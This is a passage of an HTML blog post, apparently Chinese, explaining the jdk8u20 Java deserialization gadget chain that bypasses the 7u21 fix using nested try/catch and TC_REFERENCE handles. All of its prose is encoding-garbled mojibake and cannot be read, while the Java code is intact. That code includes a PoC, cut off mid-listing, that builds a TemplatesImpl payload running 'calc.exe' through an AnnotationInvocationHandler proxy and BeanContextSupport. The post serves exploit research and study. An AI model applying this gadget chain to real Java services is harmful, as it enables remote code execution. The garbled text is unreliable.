<p>å¯¹æˆ‘ä»¬<code>type</code>è¿›è¡Œäº†<code>ç±»å‹é™åˆ¶</code>ï¼Œå¯¼è‡´æˆ‘ä»¬å°†<code>type</code>è®¾ç½®æˆ<code>Templates.class</code>æ—¶ä¼š<code>throwé”™è¯¯</code>ä¸­æ–­æˆ‘ä»¬çš„ååºåˆ—åŒ–ï¼Œ</p>
<p><img loading="lazy" src="images/image-20250509202747794.png" alt="image-20250509202747794"  />
</p>
<h2 id="jdk8u20">jdk8u20<a hidden class="anchor" aria-hidden="true" href="#jdk8u20">#</a></h2>
<blockquote>
<p>è¿™é‡Œä¸»è¦ä¾é çš„æ˜¯@1nhannå¸ˆå‚…é‚£ç¯‡æ–‡ç« ï¼Œä¸è½»æ¾æ</p>
</blockquote>
<p>é’ˆå¯¹7u21çš„ç»•è¿‡ï¼Œä¸»è¦åˆ©ç”¨ä¸¤ä¸ªç‰¹æ€§</p>
<ul>
<li>åŒå±‚try/catch</li>
<li>TC_REFERENCE</li>
</ul>
<h3 id="åŒå±‚trycatch">åŒå±‚try/catch<a hidden class="anchor" aria-hidden="true" href="#åŒå±‚trycatch">#</a></h3>
<p>ç›´æ¥å†™çœ‹ä¸ªdemoå§ï¼Œè¿™é‡Œæˆ‘ä»¬ä¼šå‘ç°<code>é‡Œå±‚try</code>ä¼šthrowé”™è¯¯ï¼Œä½†æ˜¯è¿™ä¸ªæ—¶å€™å¹¶ä¸ä¼šç›´æ¥ä¸­æ–­ç¨‹åºï¼Œç›¸å½“äº<code>é‡Œå±‚try/catch</code>éƒ½å±äº<code>å¤–å±‚tryçš„ä»£ç </code>ï¼Œæ‰€ä»¥è¿™æ—¶åº”è¯¥è·³è½¬åˆ°<code>å¤–å±‚çš„catch</code>ï¼Œè€Œ<code>å¤–å±‚catchæ²¡æœ‰throw</code>æ—¶<code>åé¢çš„ä»£ç </code>ä¾ç„¶å¯ä»¥<code>æ­£å¸¸</code>è¿è¡Œ</p>
<p>å½“ç„¶è¿™é‡Œå¤–å±‚catchæ˜¯throwçš„è¯ï¼Œè¿™ä¸ªä¼šè¿”å›<code>bitch2</code></p>
<p>è¿˜æœ‰ä¸€ç‚¹å¤–å±‚catchçš„æ•è·ç±»å‹è¦åŒ…å«å†…å±‚çš„throwï¼Œå¦‚æœå¤–å±‚æ˜¯IOExceptionï¼Œå†…å±‚æ˜¯Exceptionï¼Œè¿™æ—¶å°±ä¼šæ•è·ä¸åˆ°ï¼Œç„¶åæŠ¥é”™ç»ˆç«¯</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">error</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">1</span><span class="o">/</span><span class="n">0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Exception</span><span class="p">(</span><span class="s">&#34;bitch&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        }catch (IOException e){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//            throw new Exception(&#34;bitch2&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;fuck&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>è€Œ<code>AnnotationInvocationHandler#readObject</code>ä¸­æ˜¯å…ˆå°±æ‰§è¡Œäº†<code>s.defaultReadObject();</code>å†å¯¹<code>type</code>è¿›è¡Œçš„åˆ¤æ–­</p>
<p>è¿™æ ·ä¹Ÿå°±æ˜¯ï¼Œè¿›è¡Œtypeåˆ¤æ–­åçš„ä»£ç ï¼Œæˆ‘å…¶å®å¹¶ä¸éœ€è¦ï¼ˆgadgetä¸ç”¨åé¢çš„è°ƒç”¨ï¼‰ï¼Œæˆ‘åªéœ€è¦<code>AnnotationInvocationHandlerå¯¹è±¡</code>è€Œå·²ï¼Œæ‰€ä»¥è¿™é‡Œé <code>åŒå±‚try/catch</code>èƒ½è®©<code>AnnotationInvocationHandlerè¿˜åŸå¯¹è±¡</code>å³å¯ï¼Œtypeåé¢çš„ä»£ç æ‰§è¡Œä¸äº†ä¹Ÿæ— æ‰€è°“</p>
<p><img loading="lazy" src="images/image-20250509204039608.png" alt="image-20250509204039608"  />
</p>
<p>æ‰€ä»¥gadgetä¸­å¦‚æœæœ‰ä»£ç èƒ½æ»¡è¶³è¿™ä¸ªä¸€ä¸ªä¾‹å­ï¼Œæ˜¯ä¸æ˜¯å°±èƒ½è®©AnnotationInvocationHandler#readObjectä¸ä¸­æ–­ç¨‹åºäº†å‘¢</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">os</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w"> </span><span class="c1">//è¿™ä¸ªè¿›è¡ŒAnnotationInvocationHandler#readObject</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">;</span><span class="w">            </span><span class="c1">//ç„¶åä¼šè·³è½¬åˆ°è¿™è¡Œæ¥ï¼Œåªè¦ä¸æ˜¯ä»€ä¹ˆå¼ºåˆ¶é€€å‡ºçš„ä»£ç æ˜¯ä¸æ˜¯å°±èƒ½ç”¨äº†å‘¢</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>ç„¶åè¿˜æœ‰ä¸€ç‚¹è¦è€ƒè™‘ï¼Œå°±æ˜¯æ®µä»£ç è¦èƒ½è¢«æˆ‘ä»¬<code>gadgetè°ƒç”¨</code>ä¸”èƒ½<code>æ§åˆ¶oså€¼</code>ä¸ºæˆ‘ä»¬AnnotationInvocationHandleråºåˆ—åŒ–æ•°æ®</p>
<p>è¿™é‡Œ<code>java.beans.beancontext.BeanContextSupport</code> å°±åˆšå¥½æ»¡è¶³æˆ‘ä»¬çš„æ¡ä»¶ï¼Œè¿™ä¸ªç±»çš„ <code>readObject()</code> ï¼Œè°ƒç”¨äº† <code>readChildren(ois);</code>ä¸‹å›¾å…¶ä»£ç ä¸­å¯ä»¥çœ‹åˆ°catchæ˜¯æ»¡è¶³æ¡ä»¶çš„</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kd">synchronized</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">readObject</span><span class="p">(</span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">synchronized</span><span class="p">(</span><span class="n">BeanContext</span><span class="p">.</span><span class="na">globalHierarchyLock</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">defaultReadObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">initialize</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">bcsPreDeserializationHook</span><span class="p">(</span><span class="n">ois</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">serializable</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">getBeanContextPeer</span><span class="p">()))</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">readChildren</span><span class="p">(</span><span class="n">ois</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">deserialize</span><span class="p">(</span><span class="n">ois</span><span class="p">,</span><span class="w"> </span><span class="n">bcmListeners</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ArrayList</span><span class="p">(</span><span class="n">1</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20250509211351382.png" alt="image-20250509211351382"  />
</p>
<h3 id="tc_reference">TC_REFERENCE<a hidden class="anchor" aria-hidden="true" href="#tc_reference">#</a></h3>
<p>è¿™ä¸ªç®€å•è¯´å°±æ˜¯ï¼Œjavaåºåˆ—åŒ–/ååºåˆ—åŒ–å¯¹æ¯ä¸ªå¯¹è±¡äº§ç”Ÿæ—¶éƒ½è®¾ç½®äº†ä¸€ä¸ª<code>Handlerå€¼</code>(ç±»ä¼¼ç´¢å¼•)ï¼Œè€Œä½ ç¬¬äºŒæ¬¡è°ƒç”¨<code>åŒä¸€ä¸ªå¯¹è±¡</code>æ—¶ï¼Œjavaä¼šç›´æ¥é€šè¿‡è¿™ä¸ª<code>Handlerå€¼</code>æ‰¾åˆ°ç¬¬ä¸€æ¬¡ç”Ÿæˆçš„å¯¹è±¡è¿›è¡Œè°ƒç”¨</p>
<p>è¿˜æ˜¯é€šè¿‡demoè¯´ä¸‹å§ï¼ˆè¿™ä¸ªç‰¹æ€§ç»•è¿‡fastjsonåŸç”Ÿé“¾é‚£ä¸ªæ˜¯åŒä¸€ä¸ªï¼‰æ‡’ï¼Œdemoä¹Ÿæ˜¯ç›´æ¥copyçš„ï¼Œåˆ«å–·</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.Serializer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.File</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Test</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Fuck</span><span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Fuck</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="n">l</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="n">f</span><span class="p">,</span><span class="n">f</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">ser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Serializer</span><span class="p">.</span><span class="na">serialize</span><span class="p">(</span><span class="n">l</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">writeFile</span><span class="p">(</span><span class="n">ser</span><span class="p">,</span><span class="s">&#34;1.txt&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">writeFile</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">content</span><span class="p">,</span><span class="n">String</span><span class="w"> </span><span class="n">path</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">File</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="n">path</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="n">file</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">f</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">content</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">f</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>å°±è¿™é‡Œä¸æ˜¯æœ‰2ä¸ªfä¹ˆï¼Œéƒ½è°ƒç”¨çš„åŒä¸€ä¸ªå¯¹è±¡ï¼Œè¿™é‡Œåºåˆ—åŒ–æ—¶ï¼Œåªä¼šç»™ç¬¬ä¸€ä¸ªfå®Œæ•´çš„åºåˆ—åŒ–ï¼Œè€Œç¬¬äºŒä¸ªfåˆ™å­˜å‚¨ç¬¬ä¸€ä¸ªfçš„<code>Handler</code>ï¼Œè€Œååºåˆ—åŒ–æ—¶ï¼Œä¹Ÿæ˜¯å…ˆååºåˆ—åŒ–ç¬¬ä¸€ä¸ªfï¼Œåˆ°ç¬¬äºŒä¸ªfè¿˜åŸå¯¹è±¡æ—¶ï¼Œç›´æ¥æŠŠç¬¬ä¸€ä¸ªfçš„å¯¹è±¡ç»™ä»–</p>
<blockquote>
<p>å…³äº<code>Handler</code>çš„ä¸€ä¸ªå°çŸ¥è¯†ï¼Œ<code>åºåˆ—åŒ–æ•°æ®</code>é‡Œé¢ <code>ç¬¬ä¸€ä¸ªHandler</code>å€¼éƒ½æ˜¯ <code>@Handler - 8257536 (0x7E0000)</code>ï¼Œç„¶åæ¯æ–°äº§ç”Ÿä¸€ä¸ªHandlerï¼Œå€¼+1ï¼Œç¬¬äºŒä¸ªHandlerå°±ä¸º8257537</p>
</blockquote>
<h3 id="åˆ©ç”¨æ€è·¯">åˆ©ç”¨æ€è·¯<a hidden class="anchor" aria-hidden="true" href="#åˆ©ç”¨æ€è·¯">#</a></h3>
<p>ç„¶åè¯´äº†è¿™ä¹ˆå¤šåˆ°åº•æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿ</p>
<p>è¿˜è®°å¾—7u21æˆ‘ä»¬ç”¨çš„<code>LinkedHashSet</code>ä¼ äº†ä¸€ä¸ªå€¼ï¼Œåé¢hashç¢°æ’</p>
<ol>
<li>æˆ‘ä»¬è®©<code>BeanContextSupport</code>åŒ…è£¹<code>AnnotationInvocationHandler</code>ç„¶åæ”¾åœ¨ç¬¬ä¸€ä½//ç”¨äºè¿˜åŸ<code>AnnotationInvocationHandlerå¯¹è±¡</code></li>
<li>TemplatesImplæ”¾ç¬¬äºŒä½ï¼Œå’Œ7u21ä¸€æ ·ç”¨äºhashçš„ç¢°æ’</li>
<li>Proxyæ”¾ç¬¬ä¸‰ä½ï¼Œå…¶ä¸­<code>ä»£ç†ç±»</code>å’Œæˆ‘ä»¬<code>BeanContextSupport</code>åŒ…è£¹çš„æ˜¯åŒä¸€ä¸ªå¯¹è±¡å°±è¡Œäº†</li>
</ol>
<p>è¿™æ ·ä¼šå…ˆååºåˆ—åŒ–<code>BeanContextSupport</code>å¯¹è±¡ï¼Œå°±ä¼šæŠŠ<code>AnnotationInvocationHandler</code>è¿˜åŸäº†ã€‚ç„¶å<code>proxyåˆ©ç”¨æ—¶</code>ç›´æ¥é€šè¿‡<code>Handler</code>è°ƒç”¨<code>è¿˜åŸäº†çš„AnnotationInvocationHandlerå¯¹è±¡</code>ï¼ˆåé¢å°±å’Œ7u21ä¸€æ ·äº†</p>
<h3 id="poc-æŠ¥é”™">poc æŠ¥é”™<a hidden class="anchor" aria-hidden="true" href="#poc-æŠ¥é”™">#</a></h3>
<blockquote>
<p>å‰è¨€ï¼šè·³è·³ç³–é‚£ç¯‡æ–‡ç« å¾ˆå¥½ï¼Œä½†æ˜¯å…³äº<code>æœ€åé‚£ä¸ªæŠ¥é”™</code>é—®é¢˜æˆ‘è§‰å¾—å…‰çœ‹é‚£ç¯‡æ–‡ç« è‚¯å®šæ˜¯æä¸æ˜ç™½çš„ä»¥åŠä¸ºä»€ä¹ˆåˆ é‚£ä¸¤ä¸ªæ•°æ®ï¼Œä¸ºä»€ä¹ˆä¸èƒ½æ·»åŠ å‘¢ï¼Ÿä¸ºä»€ä¹ˆåˆ é™¤äº†æ•°æ®ä¼šä¸å‡ºä¹±å­è€Œå¯ä»¥æ­£å¸¸åˆ©ç”¨å‘¢ï¼Ÿå…¶å®éƒ½æ²¡äº¤ä»£ï¼ˆ<strong>è‡³å°‘åœ¨æˆ‘çš„è§†è§’</strong>ä¸‹æ˜¯è¿™æ ·çš„ï¼Œä¹Ÿå¯èƒ½æ˜¯æˆ‘èœ!^!ï¼‰ï¼Œç„¶åç¬”è€…ä¸‹é¢è®°å½•çš„å…‰çœ‹è‚¯å®šä¹Ÿæ˜¯ç†è§£ä¸äº†ï¼Œè¦è‡ªå·±æ‰¾åˆ°å¯¹åº”ç‚¹è°ƒè¯•å’Œå¯¹åº”åºåˆ—åŒ–æ•°æ®æ‰èƒ½ä½“ä¼šå…¶ä¸­çš„çœŸæ„</p>
</blockquote>
<p>ç›´æ¥copyçš„<a href="https://tttang.com/archive/1729/#toc_poc1">poc</a>ï¼Œç„¶åä¹Ÿå¾ˆå¥½ç†è§£å§ï¼Œä½†æ˜¯åˆäº§ç”Ÿäº†ä¸€ä¸ªæ–°çš„æŠ¥é”™ï¼ï¼ï¼ï¼ˆä¸ºäº†ææ˜ç™½è¿™ä¸ªæŠ¥é”™ä¹Ÿæ˜¯èŠ±è´¹äº†ä¸€äº›æ—¶é—´ï¼‰</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.Deserializer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.Serializer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.payloads.util.Gadgets</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.payloads.util.Reflections</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.Templates</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.beans.beancontext.BeanContextSupport</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationHandler</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.LinkedHashSet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Poc</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">templates</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">TemplatesImpl</span><span class="p">)</span><span class="w"> </span><span class="n">Gadgets</span><span class="p">.</span><span class="na">createTemplatesImpl</span><span class="p">(</span><span class="s">&#34;calc.exe&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">ih</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="w"> </span><span class="n">Reflections</span><span class="p">.</span><span class="na">getFirstCtor</span><span class="p">(</span><span class="n">Gadgets</span><span class="p">.</span><span class="na">ANN_INV_HANDLER_CLASS</span><span class="p">).</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Override</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">ih</span><span class="p">,</span><span class="s">&#34;type&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Templates</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Templates</span><span class="w"> </span><span class="n">proxy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Gadgets</span><span class="p">.</span><span class="na">createProxy</span><span class="p">(</span><span class="n">ih</span><span class="p">,</span><span class="n">Templates</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">BeanContextSupport</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BeanContextSupport</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="s">&#34;serializable&#34;</span><span class="p">,</span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">tmpMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">tmpMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">ih</span><span class="p">,</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="s">&#34;children&#34;</span><span class="p">,</span><span class="n">tmpMap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">LinkedHashSet</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">LinkedHashSet</span><span class="p">();</span><span class="c1">//è¿™æ ·å¯ä»¥ç¡®ä¿å…ˆååºåˆ—åŒ– templates å†ååºåˆ—åŒ– proxy</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">set</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">b</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">set</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">set</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">proxy</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">hm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hm</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;f5a5a608&#34;</span><span class="p">,</span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">ih</span><span class="p">,</span><span class="s">&#34;memberValues&#34;</span><span class="p">,</span><span class="n">hm</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
